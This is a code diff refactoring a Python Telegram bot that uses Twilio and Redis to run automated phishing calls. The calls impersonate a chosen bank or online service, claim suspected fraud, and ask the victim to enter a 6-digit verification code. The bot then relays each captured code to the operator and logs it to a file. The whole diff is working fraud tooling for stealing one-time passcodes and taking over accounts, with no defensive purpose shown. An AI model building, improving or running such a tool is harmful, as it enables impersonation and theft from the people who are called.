@@ -12,6 +12,8 @@ import phonenumbers
 from dotenv import load_dotenv
 import redis
 from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor
+
 
 # Configure logging with UTF-8 encoding
 logging.basicConfig(
@@ -43,46 +45,16 @@ TWILIO_FUNCTION_URL = os.getenv("TWILIO_FUNCTION_URL")
 # Redis configuration
 REDIS_URL = os.getenv("REDIS_URL")
 REDIS_SOCKET_TIMEOUT = 5
+MAX_REDIS_RETRIES = 3 # Maximum number of retries to connect to redis
+
 
 # Initialize bot at module level
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
 
-# Set webhook on module import
-# Enhanced webhook setup
-def setup_webhook():
-    webhook_url = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME')}/{TELEGRAM_BOT_TOKEN}"
-    try:
-        # First get current webhook info
-        webhook_info = bot.get_webhook_info()
-        logging.info(f"Current webhook info: {webhook_info}")
-        
-        # Remove existing webhook
-        bot.remove_webhook()
-        logging.info("Removed existing webhook")
-        
-        # Set new webhook with proper parameters
-        bot.set_webhook(
-            url=webhook_url,
-            max_connections=40,
-            allowed_updates=["message", "callback_query"],
-            drop_pending_updates=True
-        )
-        
-        # Verify webhook is set correctly
-        new_webhook_info = bot.get_webhook_info()
-        logging.info(f"New webhook info: {new_webhook_info}")
-        return True
-            
-    except Exception as e:
-        logging.error(f"Failed to set webhook: {e}")
-        return False
-
-# Initial webhook setup attempt
-setup_webhook()
-
 # User state storage with call tracking
 user_states = {}
 active_calls = {}
+call_executor = ThreadPoolExecutor(max_workers=5)
 
 # Bank and Service options
 BANK_OPTIONS = [
@@ -161,7 +133,6 @@ def create_verification_type_keyboard():
     )
     return markup
 
-
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     """Handle /start command."""
@@ -214,7 +185,7 @@ def handle_callback_query(call):
             chat_id,
             "👤 Enter the name of the call recipient:"
         )
-        user_states[chat_id] = "awaiting_recipient_name"
+        user_states[chat_id] = {"state": "awaiting_recipient_name"}
     
     elif call.data == "help":
         bot.answer_callback_query(call.id)
@@ -267,28 +238,19 @@ def handle_callback_query(call):
     
     elif call.data == "verify_bank":
        bot.answer_callback_query(call.id)
-       if isinstance(user_states.get(chat_id),dict):
-         user_states[chat_id]["state"] = "awaiting_bank"
-       else:
-           user_states[chat_id] = {"state":"awaiting_bank"}
+       user_states[chat_id]["state"] = "awaiting_bank"
        bot.send_message(chat_id, "🏦 Select the banking institution:", reply_markup=create_bank_keyboard())
     
     elif call.data == "verify_service":
         bot.answer_callback_query(call.id)
-        if isinstance(user_states.get(chat_id),dict):
-            user_states[chat_id]["state"] = "awaiting_service"
-        else:
-             user_states[chat_id] = {"state":"awaiting_service"}
+        user_states[chat_id]["state"] = "awaiting_service"
         bot.send_message(chat_id, "🌐 Select a service:", reply_markup=create_service_keyboard())
 
     elif call.data.startswith("bank_"):
        bank_name = call.data[5:]
        bot.answer_callback_query(call.id, text=f"Selected: {bank_name}")
-       if isinstance(user_states.get(chat_id),dict):
-        user_states[chat_id]["state"] = "awaiting_phone"
-        user_states[chat_id]["bank"] = bank_name
-       else:
-           user_states[chat_id] = {"state":"awaiting_phone", "bank":bank_name}
+       user_states[chat_id]["state"] = "awaiting_phone"
+       user_states[chat_id]["bank"] = bank_name
        bot.send_message(
            chat_id,
             "📱 Enter the phone number to verify:\n"
@@ -298,11 +260,8 @@ def handle_callback_query(call):
     elif call.data.startswith("service_"):
         service_name = call.data[8:]
         bot.answer_callback_query(call.id, text=f"Selected: {service_name}")
-        if isinstance(user_states.get(chat_id),dict):
-            user_states[chat_id]["state"] = "awaiting_phone"
-            user_states[chat_id]["service"] = service_name
-        else:
-             user_states[chat_id] = {"state":"awaiting_phone", "service":service_name}
+        user_states[chat_id]["state"] = "awaiting_phone"
+        user_states[chat_id]["service"] = service_name
         bot.send_message(
            chat_id,
             "📱 Enter the phone number to verify:\n"
@@ -332,26 +291,27 @@ def handle_messages(message):
         )
         return
 
-    if user_states[chat_id] == "awaiting_recipient_name":
-        user_states[chat_id] = {"state":"awaiting_verification_type", "recipient_name":message.text.strip()}
+    if user_states[chat_id].get("state") == "awaiting_recipient_name":
+        user_states[chat_id]["state"] = "awaiting_verification_type"
+        user_states[chat_id]["recipient_name"] = message.text.strip()
         bot.send_message(chat_id, "Choose the type of verification:", reply_markup=create_verification_type_keyboard())
         
-    elif isinstance(user_states[chat_id], dict) and user_states[chat_id].get("state") == "awaiting_bank":
+    elif user_states[chat_id].get("state") == "awaiting_bank":
         bot.send_message(chat_id, "🏦 Select the banking institution:", reply_markup=create_bank_keyboard())
     
-    elif isinstance(user_states[chat_id], dict) and user_states[chat_id].get("state") == "awaiting_service":
+    elif user_states[chat_id].get("state") == "awaiting_service":
         bot.send_message(chat_id, "🌐 Select a service:", reply_markup=create_service_keyboard())
     
-    elif isinstance(user_states[chat_id], dict) and user_states[chat_id].get("state") == "awaiting_phone":
-       if user_states[chat_id].get("bank"):
-         handle_phone_number(message,user_states[chat_id].get("recipient_name"),user_states[chat_id].get("bank"),None)
-       elif user_states[chat_id].get("service"):
-         handle_phone_number(message,user_states[chat_id].get("recipient_name"),None,user_states[chat_id].get("service"))
+    elif user_states[chat_id].get("state") == "awaiting_phone":
+        handle_phone_number(message)
 
-def handle_phone_number(message,recipient_name,bank_name,service_name):
+def handle_phone_number(message):
     """Handle phone number input with detailed status updates."""
     chat_id = message.chat.id
     phone_number = message.text.strip()
+    recipient_name = user_states[chat_id].get("recipient_name")
+    bank_name = user_states[chat_id].get("bank")
+    service_name = user_states[chat_id].get("service")
     
     if not validate_phone_number(phone_number):
         bot.send_message(
@@ -368,199 +328,212 @@ def handle_phone_number(message,recipient_name,bank_name,service_name):
         "Please wait for status updates."
     )
 
-    # Create Redis client
-    redis_client = create_redis_client()
-    if redis_client is None:
-        bot.edit_message_text(
-            "❌ Redis connection failed. Please try again.",
-            chat_id=chat_id,
-            message_id=status_message.message_id
-        )
-        return
+    # Submit call initiation to thread pool
+    call_executor.submit(initiate_verification_call, chat_id, phone_number, recipient_name, bank_name, service_name, status_message)
 
-    try:
-        # Generate TwiML
-        response = VoiceResponse()
-        if bank_name:
-            response.say(
-                f"Hello {recipient_name}. This is an automated verification call from {bank_name} to prevent a suspected fraudulent activity on your account. "
-                "Please listen carefully. You will need to enter the 6-digit verification code you received. "
-                "Press the digits slowly and clearly.",
-                voice="Polly.Joanna",
-                language="en-US"
-            )
-        elif service_name:
-            response.say(
-                f"Hello {recipient_name}. This is an automated call from {service_name} for verification purposes. "
-                 "Please listen carefully. You will need to enter the 6-digit verification code you received. "
-                 "Press the digits slowly and clearly.",
-                 voice="Polly.Joanna",
-                 language="en-US"
+def initiate_verification_call(chat_id, phone_number, recipient_name, bank_name, service_name, status_message):
+      """Initiate the verification call and monitor its status."""
+      redis_client = create_redis_client()
+      if redis_client is None:
+          bot.edit_message_text(
+              "❌ Redis connection failed. Please try again.",
+              chat_id=chat_id,
+              message_id=status_message.message_id
+          )
+          return
+      try:
+          # Generate TwiML
+          response = VoiceResponse()
+          if bank_name:
+              response.say(
+                  f"Hello {recipient_name}. This is an automated verification call from {bank_name} to prevent a suspected fraudulent activity on your account. "
+                  "Please listen carefully. You will need to enter the 6-digit verification code you received. "
+                  "Press the digits slowly and clearly.",
+                  voice="Polly.Joanna",
+                  language="en-US"
+              )
+          elif service_name:
+              response.say(
+                  f"Hello {recipient_name}. This is an automated call from {service_name} for verification purposes. "
+                   "Please listen carefully. You will need to enter the 6-digit verification code you received. "
+                   "Press the digits slowly and clearly.",
+                   voice="Polly.Joanna",
+                   language="en-US"
+               )
+          gather = response.gather(
+              num_digits=6,
+              timeout=15,
+              action=TWILIO_FUNCTION_URL,
+              method="POST"
+          )
+          gather.say(
+              "Please enter your verification code now.",
+              voice="Polly.Joanna",
+              language="en-US"
+          )
+
+          # Initiate the call
+          client = Client(ACCOUNT_SID, AUTH_TOKEN)
+          call = client.calls.create(
+              to=phone_number,
+              from_=TWILIO_PHONE_NUMBER,
+              twiml=str(response)
+          )
+          # Update message with call SID
+          if bank_name:
+              bot.edit_message_text(
+                 f"📞 Call initiated for {recipient_name} from {bank_name}\nID: `{call.sid}`\nStatus: *Initiating...*",
+                 chat_id=chat_id,
+                 message_id=status_message.message_id,
+                 parse_mode="Markdown",
+                 reply_markup=create_cancel_call_keyboard(call.sid)
              )
-        gather = response.gather(
-            num_digits=6,
-            timeout=15,
-            action=TWILIO_FUNCTION_URL,
-            method="POST"
-        )
-        gather.say(
-            "Please enter your verification code now.",
-            voice="Polly.Joanna",
-            language="en-US"
-        )
-
-        # Initiate the call
-        client = Client(ACCOUNT_SID, AUTH_TOKEN)
-        call = client.calls.create(
-            to=phone_number,
-            from_=TWILIO_PHONE_NUMBER,
-            twiml=str(response)
-        )
-        # Update message with call SID
-        if bank_name:
-           bot.edit_message_text(
-               f"📞 Call initiated for {recipient_name} from {bank_name}\nID: `{call.sid}`\nStatus: *Initiating...*",
-               chat_id=chat_id,
-               message_id=status_message.message_id,
-               parse_mode="Markdown",
-               reply_markup=create_cancel_call_keyboard(call.sid)
-           )
-        elif service_name:
-            bot.edit_message_text(
-               f"📞 Call initiated for {recipient_name} from {service_name}\nID: `{call.sid}`\nStatus: *Initiating...*",
-               chat_id=chat_id,
-               message_id=status_message.message_id,
-               parse_mode="Markdown",
-               reply_markup=create_cancel_call_keyboard(call.sid)
-           )
-
-        # Monitor call status
-        max_wait_time = 120  # 2 minutes
-        start_time = time.time()
-        call_status = call.status
-        last_status = None
-
-        status_emojis = {
-            'queued': '⏳',
-            'ringing': '🔔',
-            'in-progress': '📞',
-            'completed': '✅',
-            'busy': '⏰',
-            'failed': '❌',
-            'no-answer': '📵',
-            'canceled': '🚫'
-        }
-
-        while call_status not in ['completed', 'busy', 'failed', 'no-answer', 'canceled']:
-            if time.time() - start_time > max_wait_time:
-                bot.edit_message_text(
-                    "⏱ Call verification timed out. Please try again.",
-                    chat_id=chat_id,
-                    message_id=status_message.message_id
-                )
-                return
-            try:
-                call = client.calls(call.sid).fetch()
-                call_status = call.status
-                
-                # Update message only if status changed
-                if call_status != last_status:
-                    emoji = status_emojis.get(call_status, '🔄')
-                    status_text = (
-                        f"📱 *Call Status Update*\n\n"
-                        f"ID: `{call.sid}`\n"
-                        f"Status: {emoji} *{call_status.title()}*\n"
-                        f"Phone: `{phone_number}`\n"
-                        f"Time: {time.strftime('%H:%M:%S')}"
-                    )
-                    bot.edit_message_text(
-                        status_text,
-                        chat_id=chat_id,
-                        message_id=status_message.message_id,
-                        parse_mode="Markdown",
-                         reply_markup=create_cancel_call_keyboard(call.sid)
-                    )
-                    last_status = call_status
-            except Exception as e:
-                logging.error(f"Error fetching call status: {e}")
-                continue
+          elif service_name:
+              bot.edit_message_text(
+                 f"📞 Call initiated for {recipient_name} from {service_name}\nID: `{call.sid}`\nStatus: *Initiating...*",
+                 chat_id=chat_id,
+                 message_id=status_message.message_id,
+                 parse_mode="Markdown",
+                 reply_markup=create_cancel_call_keyboard(call.sid)
+             )
             
-            time.sleep(2)
-
-        # Handle final call status
-        if call_status == 'completed':
-            # Wait briefly for OTP to be stored in Redis
-            time.sleep(2)
-
-            # Try to retrieve OTP
-            otp_key = f"otp:{call.sid}"
-            try:
-                otp_code = redis_client.get(otp_key)
-                if otp_code:
-                    if bank_name:
-                        success_message = (
-                            f"✅ *Verification Successful!*\n\n"
-                            f"👤 Recipient: `{recipient_name}`\n"
-                            f"🏦 Bank: `{bank_name}`\n"
-                            f"📱 Number: `{phone_number}`\n"
-                            f"🔑 Code: `{otp_code}`\n"
-                            f"🕒 Time: {time.strftime('%H:%M:%S')}"
-                        )
-                    elif service_name:
-                        success_message = (
-                            f"✅ *Verification Successful!*\n\n"
-                            f"👤 Recipient: `{recipient_name}`\n"
-                            f"🌐 Service: `{service_name}`\n"
-                            f"📱 Number: `{phone_number}`\n"
-                            f"🔑 Code: `{otp_code}`\n"
-                            f"🕒 Time: {time.strftime('%H:%M:%S')}"
-                        )
-                   
-                    bot.edit_message_text(
-                        success_message,
-                        chat_id=chat_id,
-                        message_id=status_message.message_id,
-                        parse_mode="Markdown"
-                    )
-                    redis_client.delete(otp_key)
-                    
-                    # Save verification to file
-                    try:
-                        with open("verified.txt", "a", encoding='utf-8') as f:
-                            if bank_name:
-                                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] User ID: {chat_id}, Name:{recipient_name}, Bank:{bank_name}, Phone: {phone_number}, Code: {otp_code}\n")
-                            elif service_name:
-                                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] User ID: {chat_id}, Name:{recipient_name}, Service:{service_name}, Phone: {phone_number}, Code: {otp_code}\n")
-                    except IOError as e:
-                        logging.error(f"Error saving verification: {e}")
-                else:
-                    bot.edit_message_text(
-                        "⚠️ Call completed but no code was entered.\nPlease try again.",
-                        chat_id=chat_id,
-                        message_id=status_message.message_id
-                    )
-            except redis.exceptions.RedisError as e:
-                bot.edit_message_text(
-                    f"❌ Error retrieving verification code: {str(e)}",
-                    chat_id=chat_id,
-                    message_id=status_message.message_id
-                )
-        else:
-            bot.edit_message_text(
-                f"❌ Call failed: {call_status}\nPlease try again.",
+          # Monitor call status
+          monitor_call_status(chat_id, call.sid, phone_number, recipient_name, bank_name, service_name, status_message, redis_client)
+      except Exception as e:
+          bot.edit_message_text(
+                f"❌ Error during verification: {str(e)}",
                 chat_id=chat_id,
                 message_id=status_message.message_id
             )
-        
-    except Exception as e:
-        bot.edit_message_text(
-            f"❌ Error during verification: {str(e)}",
-            chat_id=chat_id,
-            message_id=status_message.message_id
-        )
-    finally:
-        if redis_client:
-            redis_client.close()
+      finally:
+          if redis_client:
+             redis_client.close()
+
+def monitor_call_status(chat_id, call_sid, phone_number, recipient_name, bank_name, service_name, status_message, redis_client):
+    """Monitors call status using a loop."""
+    client = Client(ACCOUNT_SID, AUTH_TOKEN)
+    max_wait_time = 120  # 2 minutes
+    start_time = time.time()
+    call_status = "queued"
+    last_status = None
+    
+    status_emojis = {
+      'queued': '⏳',
+      'ringing': '🔔',
+      'in-progress': '📞',
+      'completed': '✅',
+      'busy': '⏰',
+      'failed': '❌',
+      'no-answer': '📵',
+      'canceled': '🚫'
+    }
+
+    while call_status not in ['completed', 'busy', 'failed', 'no-answer', 'canceled']:
+        if time.time() - start_time > max_wait_time:
+              bot.edit_message_text(
+                  "⏱ Call verification timed out. Please try again.",
+                  chat_id=chat_id,
+                  message_id=status_message.message_id
+              )
+              return
+        try:
+              call = client.calls(call_sid).fetch()
+              call_status = call.status
+              
+              # Update message only if status changed
+              if call_status != last_status:
+                  emoji = status_emojis.get(call_status, '🔄')
+                  status_text = (
+                      f"📱 *Call Status Update*\n\n"
+                      f"ID: `{call.sid}`\n"
+                      f"Status: {emoji} *{call_status.title()}*\n"
+                      f"Phone: `{phone_number}`\n"
+                      f"Time: {time.strftime('%H:%M:%S')}"
+                  )
+                  bot.edit_message_text(
+                      status_text,
+                      chat_id=chat_id,
+                      message_id=status_message.message_id,
+                      parse_mode="Markdown",
+                      reply_markup=create_cancel_call_keyboard(call_sid)
+                  )
+                  last_status = call_status
+        except Exception as e:
+              logging.error(f"Error fetching call status: {e}")
+              continue
+            
+        time.sleep(2)
+
+      # Handle final call status
+    if call_status == 'completed':
+          # Wait briefly for OTP to be stored in Redis
+          time.sleep(2)
+
+          # Try to retrieve OTP
+          otp_key = f"otp:{call_sid}"
+          try:
+              otp_code = redis_client.get(otp_key)
+              if otp_code:
+                  if bank_name:
+                      success_message = (
+                          f"✅ *Verification Successful!*\n\n"
+                          f"👤 Recipient: `{recipient_name}`\n"
+                          f"🏦 Bank: `{bank_name}`\n"
+                          f"📱 Number: `{phone_number}`\n"
+                          f"🔑 Code: `{otp_code}`\n"
+                          f"🕒 Time: {time.strftime('%H:%M:%S')}"
+                      )
+                  elif service_name:
+                      success_message = (
+                          f"✅ *Verification Successful!*\n\n"
+                          f"👤 Recipient: `{recipient_name}`\n"
+                          f"🌐 Service: `{service_name}`\n"
+                          f"📱 Number: `{phone_number}`\n"
+                          f"🔑 Code: `{otp_code}`\n"
+                          f"🕒 Time: {time.strftime('%H:%M:%S')}"
+                      )
+                   
+                  bot.edit_message_text(
+                      success_message,
+                      chat_id=chat_id,
+                      message_id=status_message.message_id,
+                      parse_mode="Markdown"
+                  )
+                  redis_client.delete(otp_key)
+                    
+                  # Save verification to file
+                  try:
+                      with open("verified.txt", "a", encoding='utf-8') as f:
+                         if bank_name:
+                            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] User ID: {chat_id}, Name:{recipient_name}, Bank:{bank_name}, Phone: {phone_number}, Code: {otp_code}\n")
+                         elif service_name:
+                            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] User ID: {chat_id}, Name:{recipient_name}, Service:{service_name}, Phone: {phone_number}, Code: {otp_code}\n")
+                  except IOError as e:
+                       logging.error(f"Error saving verification: {e}")
+              else:
+                  bot.edit_message_text(
+                      "⚠️ Call completed but no code was entered.\nPlease try again.",
+                      chat_id=chat_id,
+                      message_id=status_message.message_id
+                  )
+          except redis.exceptions.RedisError as e:
+              bot.edit_message_text(
+                  f"❌ Error retrieving verification code: {str(e)}",
+                  chat_id=chat_id,
+                  message_id=status_message.message_id
+              )
+    else:
+          bot.edit_message_text(
+              f"❌ Call failed: {call_status}\nPlease try again.",
+              chat_id=chat_id,
+              message_id=status_message.message_id
+          )
+    # Clean up state after call
+    if chat_id in active_calls and active_calls[chat_id].get('call_sid') == call_sid:
+        del active_calls[chat_id]
+    if chat_id in user_states:
+       del user_states[chat_id]
+  
 
 def handle_cancel_call(chat_id, call_sid):
     """Handles cancellation of an ongoing call."""
@@ -596,32 +569,37 @@ def validate_phone_number(phone_number):
 
 def create_redis_client():
     """Create and return a Redis client with robust error handling."""
-    try:
-        if not REDIS_URL:
-            logging.error("REDIS_URL environment variable is not set.")
-            return None
+    retries = 0
+    while retries < MAX_REDIS_RETRIES:
+        try:
+            if not REDIS_URL:
+                logging.error("REDIS_URL environment variable is not set.")
+                return None
 
-        parsed_url = urlparse(REDIS_URL)
-        if parsed_url.scheme != 'rediss':
-            logging.error("REDIS_URL scheme must be 'rediss://' for Upstash Redis.")
-            return None
+            parsed_url = urlparse(REDIS_URL)
+            if parsed_url.scheme != 'rediss':
+                logging.error("REDIS_URL scheme must be 'rediss://' for Upstash Redis.")
+                return None
 
-        redis_client = redis.Redis.from_url(
-            REDIS_URL,
-            decode_responses=True,
-            socket_timeout=REDIS_SOCKET_TIMEOUT,
-            socket_connect_timeout=REDIS_SOCKET_TIMEOUT,
-            retry_on_timeout=True,
-            max_connections=20,
-            ssl_cert_reqs=None
-        )
-        redis_client.ping()
-        logging.info("Redis connection established successfully")
-        return redis_client
+            redis_client = redis.Redis.from_url(
+                REDIS_URL,
+                decode_responses=True,
+                socket_timeout=REDIS_SOCKET_TIMEOUT,
+                socket_connect_timeout=REDIS_SOCKET_TIMEOUT,
+                retry_on_timeout=True,
+                max_connections=20,
+                ssl_cert_reqs=None
+            )
+            redis_client.ping()
+            logging.info("Redis connection established successfully")
+            return redis_client
 
-    except Exception as e:
-        logging.error(f"Redis connection error: {e}")
-        return None
+        except Exception as e:
+            logging.error(f"Redis connection error, retry {retries}: {e}")
+            retries += 1
+            time.sleep(1)  # Wait before retrying
+    logging.error("Max Redis connection retries exceeded.")
+    return None
 
 # Flask route for health check
 @web_app.route('/')
@@ -660,6 +638,7 @@ def signal_handler(signum, frame):
         bot.remove_webhook()
     except:
         pass
+    call_executor.shutdown(wait=False)  # Shutdown executor without waiting
     sys.exit(0)
 
 # Register signal handlers
